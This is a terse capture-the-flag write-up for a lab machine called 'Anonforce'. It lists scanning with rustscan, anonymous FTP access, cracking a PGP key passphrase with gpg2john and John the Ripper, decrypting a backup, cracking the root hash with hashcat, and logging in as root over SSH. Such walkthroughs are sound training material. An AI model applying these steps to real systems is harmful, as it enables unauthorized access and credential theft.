---
date: 2024-06-19
authors:
  - mrashco
title: Anonforce
tags: 
categories: 
series:
---
Writeup: [YouTube](https://youtu.be/viY-a3B1ItQ) // Blog

---

rustscan -a $ip, 21:ftp 22:ssh

ftp $ip, anonymous

user = m*******

get user.txt

- cat ~/user.txt

get /notread/*

- `gpg2john private.asc > private.hash`
- `john --wordlist=/rockyou.txt private.hash`
- x******

`gpg` [🔗](https://www.reddit.com/r/GnuPG/comments/mibwbv/i_have_an_elg_private_key_how_do_i_use_it_to/) [🔗](https://en.wikipedia.org/wiki/Pretty_Good_Privacy) 

- `gpg -d backup.pgp`

nano root.hash

- `hashcat root.hash rockyou.txt`
- h*****

`ssh root@$ip`